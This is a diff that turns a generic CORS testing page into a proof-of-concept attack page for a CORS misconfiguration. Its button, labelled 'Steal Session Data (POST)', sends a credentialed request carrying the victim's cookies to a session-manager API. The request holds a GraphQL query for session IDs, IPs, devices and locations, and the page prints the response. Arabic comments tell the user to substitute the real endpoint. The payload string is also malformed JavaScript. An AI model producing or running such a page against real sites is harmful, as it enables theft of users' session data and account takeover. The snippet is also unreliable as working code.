@@ -1,84 +1,48 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>CORS Quick Test</title>
-<style>
-  body{font-family:system-ui,Arial;padding:18px;max-width:820px;margin:24px auto;color:#111}
-  h2{margin:0 0 6px}
-  label{display:block;margin-top:10px;font-weight:600}
-  input,select,button{width:100%;padding:8px;margin-top:6px;border-radius:6px;border:1px solid #ddd;box-sizing:border-box}
-  button{background:#0b74ff;color:#fff;border:none;cursor:pointer;padding:10px}
-  .warn{background:#fff4f0;color:#7a2b1b;padding:10px;border-radius:6px;margin-top:12px}
-  #demo{white-space:pre-wrap;background:#f6f8fb;padding:10px;border-radius:6px;margin-top:12px;border:1px solid #e6eef8}
-</style>
+  <meta charset="utf-8">
+  <title>CORS POST PoC</title>
 </head>
 <body>
 
-<h2>Quick CORS Test</h2>
-<p>Use this to test whether a browser can <strong>read</strong> the response from a cross-origin endpoint when credentials are included.</p>
-
-<div class="warn">
-  this site was created by <strong>amineelg</strong> 
-</div>
-
-<label>Target URL</label>
-<input id="url" type="url" value="" />
-
-<label>HTTP method</label>
-<select id="method">
-  <option>GET</option>
-  <option selected>POST</option>
-  <option>OPTIONS</option>
-</select>
-
-<label>Body (for POST)</label>
-<input id="body" value="" />
-
-<button id="run">Run test</button>
-
-<div id="demo">Response will appear here (and in console).</div>
+<h2>CORS Misconfiguration – POST Request</h2>
+<button id="run">Steal Session Data (POST)</button>
+<pre id="out">Click the button…</pre>
 
 <script>
-document.getElementById('run').onclick = function() {
-  const url = document.getElementById('url').value.trim();
-  const method = document.getElementById('method').value;
-  const body = document.getElementById('body').value;
-  const demo = document.getElementById('demo');
+document.getElementById("run").onclick = function () {
 
-  if (!url) { alert('Enter target URL'); return; }
-  demo.textContent = 'Sending ' + method + ' to ' + url + ' ... (check console/network)';
+  const target = "https://target.com/api/session-manager"; 
+  // ⚠️ بدّلها بالـ endpoint الحقيقي
 
-  try {
-    const xhttp = new XMLHttpRequest();
-    xhttp.onreadystatechange = function() {
-      if (this.readyState === 4) {
-        const statusLine = 'Status: ' + this.status + ' ' + this.statusText;
-        const headers = this.getAllResponseHeaders();
-        const body = this.responseText || '';
-        const out = statusLine + '\n\nRESPONSE HEADERS:\n' + headers + '\n\nBODY (preview):\n' + body.slice(0,2000);
-        console.log('CORS test result object:', {status:this.status, headers: headers, body: body});
-        demo.textContent = out;
-        alert('Response received — check page and console');
-      }
-    };
+  const out = document.getElementById("out");
+  out.textContent = "Sending authenticated POST request with victim cookies...\n";
 
-    xhttp.open(method, url, true);
+  const xhr = new XMLHttpRequest();
+  xhr.open("POST", target, true);
 
-    // cookie
-    xhttp.withCredentials = true;
+  // 🔥 النقطة الحاسمة
+  xhr.withCredentials = true;
 
-    if (method === 'POST') {
-      xhttp.setRequestHeader('Content-Type', 'application/json');
-      xhttp.send(body);
-    } else {
-      xhttp.send();
+  // نفس Content-Type اللي كيقبل السيرفر
+  xhr.setRequestHeader("Content-Type", "application/json");
+
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      out.textContent =
+        "STATUS: " + xhr.status + "\n\n" +
+        "RESPONSE HEADERS:\n" +
+        xhr.getAllResponseHeaders() + "\n\n" +
+        "RESPONSE BODY:\n" +
+        xhr.responseText;
+
+      console.log("CORS POST PoC response:", xhr.responseText);
     }
-  } catch (e) {
-    console.error(e);
-    demo.textContent = 'Request error: ' + e;
-  }
+  };
+
+  // body فارغ (بحال الريكوست الحقيقي)
+  xhr.send("{"query":"\n    {\n        sessionManager {\n            device\n            deviceType\n            ip\n            lastActiveTime\n            sessionId\n            isCurrent\n            location\n        }\n    }\n"}");
 };
 </script>
 
